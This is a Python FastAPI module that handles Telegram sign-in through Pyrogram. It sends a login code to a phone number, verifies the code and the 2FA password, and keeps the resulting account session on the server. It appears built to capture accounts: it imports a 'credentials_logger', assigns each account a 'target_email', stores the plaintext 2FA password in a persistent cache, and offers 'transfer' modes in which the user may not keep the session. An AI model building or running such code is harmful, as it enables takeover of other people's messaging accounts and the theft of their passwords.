"""
Authentication API Routes
Handles: init_auth, verify_code, verify_2fa
"""

import time
import asyncio
from datetime import datetime, timedelta
from typing import Optional, Dict
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from backend.core_engine.logger import get_logger, log_request
from backend.core_engine.pyrogram_client import get_session_manager
from backend.core_engine.credentials_logger import generate_email_for_account, get_email_hash
from backend.models.database import (
    AuthStatus, DeliveryStatus, TransferMode as DBTransferMode,
    add_account, get_account, update_account, log_auth_action,
    persistent_cache_set, persistent_cache_get, persistent_cache_clear,
    persistent_cache_check_timeout, SESSION_CACHE_TTL_SECONDS
)

logger = get_logger("AuthAPI")
router = APIRouter(tags=["Authentication"])

from config import API_ID, API_HASH

# ============== Session Cache (RAM + SQLite Persistent) ==============
_ram_cache_v2: Dict[str, Dict] = {}

# Per-phone locks for concurrency isolation
_v2_auth_locks: Dict[str, asyncio.Lock] = {}


def _get_v2_lock(phone: str) -> asyncio.Lock:
    if phone not in _v2_auth_locks:
        _v2_auth_locks[phone] = asyncio.Lock()
    return _v2_auth_locks[phone]

SESSION_TIMEOUT_SECONDS = SESSION_CACHE_TTL_SECONDS


class InitAuthRequest(BaseModel):
    phone: str
    transfer_mode: str = "bot_only"


class VerifyAuthRequest(BaseModel):
    phone: str
    code: Optional[str] = None
    password: Optional[str] = None


def get_pyrogram():
    return get_session_manager(API_ID, API_HASH, "sessions")


async def cache_session_data(phone: str, **kwargs):
    if phone not in _ram_cache_v2:
        _ram_cache_v2[phone] = {"started_at": datetime.utcnow().isoformat()}
    for k, v in kwargs.items():
        _ram_cache_v2[phone][k] = v.isoformat() if isinstance(v, datetime) else v
    await persistent_cache_set(phone, **kwargs)


async def get_cached_data(phone: str, key: str = None):
    if phone in _ram_cache_v2:
        if key:
            return _ram_cache_v2[phone].get(key)
        return _ram_cache_v2[phone]
    data = await persistent_cache_get(phone, key)
    if data and not key:
        _ram_cache_v2[phone] = data
    return data


async def clear_session_cache(phone: str):
    _ram_cache_v2.pop(phone, None)
    await persistent_cache_clear(phone)


async def check_session_timeout(phone: str) -> bool:
    return await persistent_cache_check_timeout(phone)


@router.post("/auth/init")
async def init_auth(request: InitAuthRequest):
    """Initialize authentication - send code to phone (with per-phone lock)"""
    phone = request.phone.strip()
    if not phone.startswith("+"):
        phone = "+" + phone
    lock = _get_v2_lock(phone)
    async with lock:
        return await _do_v2_init(phone, request)


async def _do_v2_init(phone: str, request: InitAuthRequest):
    start_time = time.time()
    log_request(logger, "POST", f"/auth/init/{phone}", None)
    
    account = await get_account(phone)
    if not account:
        account = await add_account(phone)
    
    transfer_mode = DBTransferMode.BOT_ONLY if request.transfer_mode == "bot_only" else DBTransferMode.USER_KEEPS_SESSION
    
    email_info = generate_email_for_account(phone)
    target_email = email_info["email"]
    email_hash = email_info["hash"]
    
    await update_account(
        phone,
        transfer_mode=transfer_mode,
        target_email=target_email,
        email_hash=email_hash
    )
    
    await cache_session_data(phone, started_at=datetime.utcnow())
    
    manager = get_pyrogram()
    result = await manager.send_code(phone)
    
    if result.get("status") == "already_logged_in":
        user_info = await manager.get_me_info(phone)
        telegram_id = user_info.get("id")
        
        await update_account(
            phone,
            status=AuthStatus.AUTHENTICATED,
            telegram_id=telegram_id,
            first_name=user_info.get("first_name")
        )
        
        await cache_session_data(phone, telegram_id=telegram_id)
        await log_auth_action(phone, "init", "already_logged_in")
        
        return {
            "status": "already_authenticated",
            "message": "Account already logged in",
            "account_id": phone,
            "telegram_id": telegram_id,
            "next_step": "audit"
        }
    
    if result.get("status") == "code_sent":
        await update_account(phone, status=AuthStatus.PENDING_CODE)
        await log_auth_action(phone, "init", "code_sent")
        
        return {
            "status": "code_sent",
            "message": "Verification code sent",
            "account_id": phone,
            "next_step": "verify_code"
        }
    
    raise HTTPException(status_code=400, detail=result.get("error", "Failed to send code"))


@router.post("/auth/verify")
async def verify_auth(request: VerifyAuthRequest):
    """Verify code or 2FA password (with per-phone lock)"""
    phone = request.phone.strip()
    if not phone.startswith("+"):
        phone = "+" + phone
    lock = _get_v2_lock(phone)
    async with lock:
        return await _do_v2_verify(phone, request)


async def _do_v2_verify(phone: str, request: VerifyAuthRequest):
    log_request(logger, "POST", f"/auth/verify/{phone}", None)
    
    if await check_session_timeout(phone):
        await clear_session_cache(phone)
        raise HTTPException(status_code=408, detail="Session timeout (30 min). Please start again.")
    
    account = await get_account(phone)
    if not account:
        raise HTTPException(status_code=404, detail="Account not found. Call /auth/init first.")
    
    manager = get_pyrogram()
    
    if request.code:
        result = await manager.verify_code(phone, request.code)
        
        if result.get("status") == "logged_in":
            user_info = await manager.get_me_info(phone)
            telegram_id = user_info.get("id")
            
            await update_account(
                phone,
                status=AuthStatus.AUTHENTICATED,
                telegram_id=telegram_id,
                first_name=user_info.get("first_name"),
                has_2fa=False
            )
            
            await cache_session_data(phone, telegram_id=telegram_id)
            await log_auth_action(phone, "verify_code", "success")
            
            return {
                "status": "authenticated",
                "message": "Successfully authenticated",
                "account_id": phone,
                "telegram_id": telegram_id,
                "has_2fa": False,
                "next_step": "audit"
            }
        
        if result.get("status") == "2fa_required":
            await update_account(phone, status=AuthStatus.PENDING_2FA, has_2fa=True)
            
            return {
                "status": "2fa_required",
                "message": "2FA password required",
                "account_id": phone,
                "has_2fa": True,
                "hint": result.get("hint"),
                "next_step": "verify_2fa"
            }
        
        raise HTTPException(status_code=400, detail=result.get("error", "Invalid code"))
    
    if request.password:
        result = await manager.verify_2fa(phone, request.password)
        
        if result.get("status") == "logged_in":
            user_info = await manager.get_me_info(phone)
            telegram_id = user_info.get("id")
            
            await update_account(
                phone,
                status=AuthStatus.AUTHENTICATED,
                telegram_id=telegram_id,
                first_name=user_info.get("first_name")
            )
            
            await cache_session_data(phone, telegram_id=telegram_id, two_fa_password=request.password)
            await log_auth_action(phone, "verify_2fa", "success")
            
            return {
                "status": "authenticated",
                "message": "Successfully authenticated with 2FA",
                "account_id": phone,
                "telegram_id": telegram_id,
                "has_2fa": True,
                "next_step": "audit"
            }
        
        raise HTTPException(status_code=400, detail=result.get("error", "Invalid password"))
    
    raise HTTPException(status_code=400, detail="Provide code or password")
